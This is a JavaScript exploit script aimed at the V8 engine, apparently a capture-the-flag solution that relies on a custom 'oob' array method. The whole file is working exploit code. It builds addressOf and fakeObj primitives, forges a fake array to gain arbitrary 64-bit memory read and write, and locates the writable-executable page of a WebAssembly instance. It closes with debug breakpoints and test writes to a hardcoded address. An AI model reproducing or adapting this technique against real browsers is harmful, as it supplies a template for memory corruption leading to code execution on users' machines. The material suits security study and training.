//
// Union{
//      unsigned int u32[2];
//      double    f64;
// }
function gc(){
    for(let i = 0 ; i < 0x10; i++){
        new ArrayBuffer(0x1000000);
    }
}

var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);

function d2u(v){
    f64[0] = v;
    return u32;
}

function u2d(lo, hi){
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

function hex(lo, hi){
    if(lo == 0 ){
        return "0x" + hi.toString(16) + "-00000000";
    }

    if(hi == 0){
        return "0x" + lo.toString(16);
    }

    return "0x" + hi.toString(16) + "-" + lo.toString(16);
}

function addressOf(obj_to_leak){
    obj_array[0] = obj_to_leak;
    obj_array.oob(float_array_map);

    let leak_addr = obj_array[0];
    obj_array.oob(obj_array_map);

    return leak_addr;
}

function fakeObj(fake_obj_addr){
    float_array[0] = fake_obj_addr;
    float_array.oob(obj_array_map);

    let fake_obj = float_array[0];
    float_array.oob(obj_array_map);

    return fake_obj;
}

gc();
var object = {"a":1};
var obj_array = [object]; // object array
var float_array = [1.1, 2.2, 3.3, 4.4];

float_array.toString();
%DebugPrint(float_array);
var obj_array_map = obj_array.oob();
var float_array_map = float_array.oob();

d2u(obj_array_map);
console.log('[-] object array map : '+ hex(u32[0], u32[1]));
d2u(float_array_map);
console.log('[-] float array map : '+ hex(u32[0], u32[1]));

var fake_array = [
    float_array_map, // <---------
    0,
    float_array_map, // <---------
    //u2d(0xdeadbeef),
    u2d(0, 0x10),
];

var address = addressOf(fake_array);
d2u(address);

var fake_obj_addr_lo = u32[0] + 0x30;
var fake_obj_addr_hi = u32[1];
console.log('[-] fake obj address: '+ hex(fake_obj_addr_lo, fake_obj_addr_hi));
var fake_obj_addr = u2d(fake_obj_addr_lo, fake_obj_addr_hi);

var rw_array = fakeObj(fake_obj_addr);

function read64(addr_lo, addr_hi){
    fake_array[2] = u2d(addr_lo - 0x10 +1, addr_hi);

    read_val = rw_array[0];
    return read_val;
}

function write64(addr_lo, addr_hi, value_lo, value_hi){
    fake_array[2] = u2d(addr_lo - 0x10 +1, addr_hi);

    rw_array[0] = u2d(value_lo, value_hi);
}

let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;
wasm_leak = addressOf(f);
wasm_addr = d2u(wasm_leak);
wasm_lo = wasm_addr[0];
wasm_hi = wasm_addr[1];

dtmp = read64(wasm_lo-1+0x18, wasm_hi);
utmp = d2u(dtmp);
sharedinfo_lo = utmp[0];
sharedinfo_hi = utmp[1];
dtmp = read64(sharedinfo_lo-1-0x138, sharedinfo_hi);
utmp = d2u(dtmp);
rwx_lo = utmp[0];
rwx_hi = utmp[1];
console.log("[-] rwx page: "+hex(rwx_lo, rwx_hi));
rwx_lo += 0x10;
%SystemBreak();
//write64(sharedinfo_lo-1-0x108, sharedinfo_hi, rwx_lo, rwx_hi);
//%SystemBreak();
write64(0xf73f2c30, 0x7fff, 0x12345678, 0x87654321);
//write64(rwx_lo - 0x10, rwx_hi, 0x12345678, 0x87654321);
%SystemBreak();

